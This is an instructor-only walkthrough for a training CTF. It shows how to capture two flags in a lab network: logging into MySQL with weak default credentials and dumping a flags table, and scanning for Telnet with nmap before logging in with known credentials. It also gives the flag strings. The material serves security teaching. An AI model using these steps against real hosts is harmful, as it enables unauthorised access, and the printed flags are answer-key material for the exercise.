# Week 7 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w7_sql_enumeration_success}`)

**Step 1 — Connect to MySQL:**
```bash
mysql -h 172.20.0.9 -u user -puserpassword exampledb
```

**Step 2 — Enumerate tables:**
```sql
SHOW TABLES;
-- Shows: (normal tables) + ctf_flags
```

**Step 3 — Extract the flag:**
```sql
SELECT * FROM ctf_flags;
```

---

## Flag 2 — root.txt (`flag{w7_telnet_protocol_breach}`)

**Step 1 — Scan for Telnet:**
```bash
nmap -sV -p 23 172.20.0.10
```

**Step 2 — Enumerate credentials (from lab context or brute-force):**
- Username: `ctfuser`
- Password: `telnet123`

**Step 3 — Connect via Telnet:**
```bash
telnet 172.20.0.10
# Login: ctfuser / telnet123
```

**Step 4 — Read the flag:**
```bash
cat /home/ctfuser/root.txt
```

---

## Teaching Points

- Database enumeration (`SHOW TABLES`, `SELECT *`) should always cover all tables, not just expected ones
- Telnet transmits credentials in plaintext — Wireshark capture of the login session will reveal them
- Legacy protocols (Telnet, FTP, HTTP) are high-value targets because they lack encryption
- MySQL credentials `user:userpassword` are weak defaults matching the `MYSQL_USER`/`MYSQL_PASSWORD` env vars in docker-compose
